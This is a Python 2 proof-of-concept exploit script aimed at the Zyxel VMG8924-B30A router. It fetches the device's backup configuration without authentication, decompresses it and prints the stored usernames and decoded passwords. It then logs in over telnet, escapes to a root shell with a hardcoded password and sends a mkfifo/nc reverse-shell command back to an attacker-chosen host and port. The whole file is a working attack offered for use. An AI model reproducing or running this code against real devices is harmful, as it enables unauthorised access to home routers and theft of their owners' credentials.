#!/usr/bin/env python2

# PoC unautenticate backup file download 2 remote priviledged shell
# Start listner before usage: nc -l -p 8080
# Tested on Zyxel VMG8924-B30A (o2.cz)
# Autor: winnie

import lzw
import requests
import sys
import shutil
import os
import xml.etree.ElementTree as ET
import base64
import telnetlib
import argparse


def make_request(target):
	#print(target)
	url = 'http://' + target + '/backupsettings.conf'
	print("[+] Downloading backup config file")
	r = requests.get(url)
	#print r.text
	while("window" in r.text):
		r = requests.get(url)
	return(r)

def extract_config(lzw_file, zyxel_file,r):
  # todo
	header_size = 60

	print("[+] Stripping header")
	with open(lzw_file,'wb') as f:
		r.raw.decode_content = True
		f.write(r.content[header_size:])

	try:
		mybytes = lzw.readbytes(lzw_file)
		lbytes = lzw.decompress(mybytes)
		lzw.writebytes(zyxel_file,lbytes)
	except:
		pass

def get_creds(zyxel_file):
	print("[+] Parsing xml tree")
	tree = ET.parse(zyxel_file)
	root = tree.getroot()

	print("[+] Found Usernames (X_BROADCOM_COM_LoginCfg):")
	accounts = []
	for user in root.iter('UserName'):
		try:
			accounts.append(user.text)
		except IndexError:
			pass

	passwords = []
	for passwd in root.iter('Password'):
		try:
			passwords.append(passwd.text)
		except IndexError:
			pass

	ii=0
	for i in accounts:
		print("  [*] " + i + ":" + str(base64.b64decode(passwords[ii])).rstrip('\0'))
		ii=ii+1

	ii=0
	print("[+] Found Usernames (X_TELEFONICA-ES_CIFS):")
	for user in root.iter('User'):
		try:
			print("  [*] " + user[0].text + ":" + user[1].text)
			if(ii == 0):
				admin_pwd=user[1].text
		except IndexError:
			pass
		ii=ii+1
		#print admin_pwd
	return(admin_pwd)

def remove_tmp_files():
	print("[+] Removing tmp files")
	os.unlink(lzw_file)
	os.unlink(zyxel_file)

def start_reverse_shell(lhost, lport):
	# open telnet connection, escalate privileges and start reverse shell
	reverse_shell_p1="rm /var/tmp/f;mkfifo /var/tmp/f;cat /var/tmp/f|/bin/sh -i 2>&1|nc "
	reverse_shell_p2=" >/var/tmp/f"
	console_cmd="sh"
	console_pwd="admin"
	console_usr="admin"
	
	print("[+] initiating telnet connection")
	tn = telnetlib.Telnet(rhost)

	tn.read_until("Login: ")
	tn.write(console_usr + "\n")
	tn.read_until("Password: ")
	tn.write(admin_password + "\n")

	print("[+] escaping from console")
	tn.write(console_cmd + "\n")
	tn.read_until("shell Password:")
	tn.write(console_pwd + "\n")
	tn.read_until("~ #")
	print("[+] starting reverse shell to " + lhost + ":" + lport)
	tn.write( reverse_shell_p1 + lhost + " "+ lport + reverse_shell_p2 + "\n")

	# reverse shell
	tn.write("exit\n")
	tn.write("exit\n")

	print tn.read_all()


"""
main()

"""

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--rhost", help="remote host (target)")
parser.add_argument("-l", "--lhost", help="local host for remote shell")
parser.add_argument("-p", "--lport", help="local host port for remote shell")
args = parser.parse_args()

lzw_file = "./zyxel_orig.conf"
zyxel_file = "./zyxel_plain.xml"

rhost = args.rhost
lhost = args.lhost
lport = args.lport

request = make_request(rhost)
extract_config(lzw_file, zyxel_file, request)
admin_password = get_creds(zyxel_file)
remove_tmp_files()
start_reverse_shell(lhost, lport)

